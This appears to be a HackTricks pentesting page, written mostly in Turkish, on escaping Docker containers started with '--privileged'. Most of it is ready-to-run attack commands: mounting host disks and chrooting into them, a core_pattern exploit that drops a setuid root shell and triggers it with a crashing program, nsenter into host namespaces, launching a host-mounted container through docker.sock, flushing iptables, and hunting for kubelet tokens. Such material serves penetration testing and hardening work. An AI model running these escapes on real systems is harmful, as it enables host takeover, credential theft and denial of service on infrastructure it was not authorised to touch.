# `--privileged` Konteynerlerinden Kaçış

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

`--privileged` ile başlatılan bir konteyner, bir veya iki ekstra izinli normal bir konteyner ile aynı şey değildir. Pratikte `--privileged`, iş yükünü tehlikeli host kaynaklarından uzak tutan varsayılan çalışma zamanı korumalarının birkaçını kaldırır veya zayıflatır. Kesin etki yine runtime ve hosta bağlıdır, ancak Docker için tipik sonuç şudur:

- tüm capabilities verilir
- device cgroup kısıtlamaları kaldırılır
- birçok kernel dosya sistemi artık salt okunur olarak bağlanmaz
- varsayılan maskelenmiş procfs yolları kaybolur
- seccomp filtrelemesi devre dışı bırakılır
- AppArmor sınırlaması devre dışı bırakılır
- SELinux izolasyonu devre dışı bırakılır veya çok daha geniş bir etiketle değiştirilir

Önemli sonuç şudur: bir privileged container genellikle ince bir kernel exploitine ihtiyaç duymaz. Birçok durumda doğrudan host cihazları, hosta bakan kernel dosya sistemleri veya runtime arayüzleri ile etkileşime girip ardından host shell'ine pivot yapabilir.

## `--privileged`'in Otomatik Olarak Değiştirmediği Şeyler

`--privileged` otomatik olarak host PID, network, IPC veya UTS namespace'lerine katılmaz. Bir privileged container hala özel namespace'lere sahip olabilir. Bu, bazı kaçış zincirlerinin ek bir koşul gerektirdiği anlamına gelir, örneğin:

- a host bind mount
- host PID paylaşımı
- host networking
- görünür host cihazları
- yazılabilir proc/sys arayüzleri

Bu koşullar gerçek yapılandırma hatalarında genellikle sağlanması kolaydır, ancak kavramsal olarak `--privileged`'den ayrı şeylerdir.

## Kaçış Yolları

### 1. Görünen Cihazlar Üzerinden Host Diskini Mount Etme

Bir privileged container genellikle `/dev` altında çok daha fazla device node görür. Eğer host block device görünürse, en basit kaçış onu mount edip `chroot` ile host dosya sistemine geçmektir:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
root partition belirgin değilse, önce block layout'u listeleyin:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Eğer pratik yol `chroot` yapmak yerine yazılabilir bir host mount'a bir setuid yardımcı yerleştirmekse, her dosya sistemi setuid bitini desteklemez. Hızlı bir host tarafı yetenek kontrolü şudur:
```bash
mount | grep -v "nosuid"
```
Bu, `nosuid` dosya sistemleri altındaki yazılabilir yolların klasik "drop a setuid shell and execute it later" iş akışları için çok daha az ilgi çekici olması nedeniyle kullanışlıdır.

The weakened protections being abused here are:

- tam cihaz erişimi
- geniş capabilities, özellikle `CAP_SYS_ADMIN`

İlgili sayfalar:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Bir Host Bind Mount'ını Bağlama veya Yeniden Kullanma ve `chroot`

Eğer host root dosya sistemi zaten konteyner içinde mount edilmişse, veya konteyner gerekli mount'ları oluşturabiliyorsa çünkü privileged ise, bir host shell genellikle sadece bir `chroot` uzaklıktadır:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Host root bind mount yoksa ancak host storage erişilebiliyorsa, bir tane oluşturun:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Bu yol şu zayıflıklardan yararlanır:

- zayıflatılmış mount kısıtlamaları
- tam capabilities
- MAC confinement eksikliği

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Yazılabilir `/proc/sys` veya `/sys`'i Suistimal Etme

`--privileged`'ın büyük sonuçlarından biri, procfs ve sysfs korumalarının çok zayıflamasıdır. Bu, normalde maskelenmiş veya yalnızca okunur olarak bağlanmış olan host'a yönelik kernel arayüzlerini açığa çıkarabilir.

Klasik bir örnek `core_pattern`'dir:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Diğer yüksek değere sahip yollar şunlardır:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Bu yol şu eksiklikleri kötüye kullanır:

- missing masked paths
- missing read-only system paths

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Use Full Capabilities For Mount- Or Namespace-Based Escape

A privileged container, normalde standart container'lardan kaldırılan `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` ve daha birçok yeteneği alır. Bu, başka bir exposed surface var olduğunda bir local foothold'u host escape'e dönüştürmek için genellikle yeterlidir.

A simple example is mounting additional filesystems and using namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Host PID de paylaşılıyorsa, adım daha da kısalır:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Bu yol şunları kötüye kullanır:

- varsayılan ayrıcalıklı yetenek (capability) kümesi
- isteğe bağlı host PID paylaşımı

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Runtime Soketleri Üzerinden Kaçış

Ayrıcalıklı bir container sıklıkla host'un çalışma zamanı durumu veya soketlerinin görünür hale gelmesiyle sonuçlanır. Eğer bir Docker, containerd, veya CRI-O soketine erişilebiliyorsa, en basit yaklaşım genellikle runtime API'sini kullanıp host erişimi olan ikinci bir container başlatmaktır:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
containerd için:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Bu yol şu durumları suistimal eder:

- privileged runtime exposure
- host bind mounts created through the runtime itself

İlgili sayfalar:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Ağ İzolasyonu Yan Etkilerini Kaldır

`--privileged` kendi başına host network namespace'ine katılmaz; ancak container ayrıca `--network=host` veya diğer host-ağ erişimine sahipse, tüm ağ yığını değiştirilebilir hale gelir:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Bu her zaman doğrudan bir host shell'i sağlamaz, ancak denial of service, traffic interception veya yalnızca loopback üzerinden erişilebilen yönetim hizmetlerine erişim sağlayabilir.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Host Sırlarını ve Çalışma Zamanı Durumunu Okuma

Temiz bir shell escape'i hemen gerçekleşmese bile, privileged containers genellikle host sırlarını, kubelet durumunu, çalışma zamanı metadata'sını ve komşu container dosya sistemlerini okumak için yeterli erişime sahiptir:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Eğer `/var` host-mounted ise veya runtime directories görünür durumdaysa, bu host shell elde edilmeden önce bile lateral movement veya cloud/Kubernetes credential theft için yeterli olabilir.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Kontroller

Aşağıdaki komutların amacı, hangi privileged-container escape families'in hemen uygulanabilir olduğunu doğrulamaktır.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Burada ilginç olanlar:

- tam bir capability kümesi, özellikle `CAP_SYS_ADMIN`
- yazılabilir proc/sys erişimi
- görünür host cihazları
- seccomp ve MAC confinement eksikliği
- runtime sockets veya host root bind mounts

Bunların herhangi biri post-exploitation için yeterli olabilir. Birkaç tanesi bir arada olduğunda genellikle container işlevsel olarak host compromise'a bir veya iki komut uzaklıktadır.

## İlgili Sayfalar

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
